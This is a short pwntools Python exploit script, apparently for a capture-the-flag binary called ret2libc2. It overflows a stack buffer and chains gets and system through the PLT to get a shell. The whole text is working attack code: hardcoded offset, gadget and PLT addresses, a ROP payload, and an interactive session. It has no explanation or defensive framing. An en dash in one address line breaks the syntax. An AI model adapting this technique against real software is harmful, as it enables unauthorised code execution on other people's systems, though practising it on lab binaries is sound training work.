from pwn import *

p = process('./ret2libc2')

offset = 112

bss_addr = 0x804a040 – 16 # readelf -S ret2libc2

get_addr = 0x8048460 # objdump -d -j .plt ret2libc2

pop_ret = 0x0804872f # ROPgadget --binary ret2libc2 --only "pop|ret"

system_addr = 0x8048490 # objdump -d -j .plt ret2libc2

payload = 'a'*offset + p32(get_addr) + p32(pop_ret) + p32(bss_addr) + p32(system_addr) + p32(0xdeadbeef) + p32(bss_addr)

p.sendline(payload)

p.interactive()
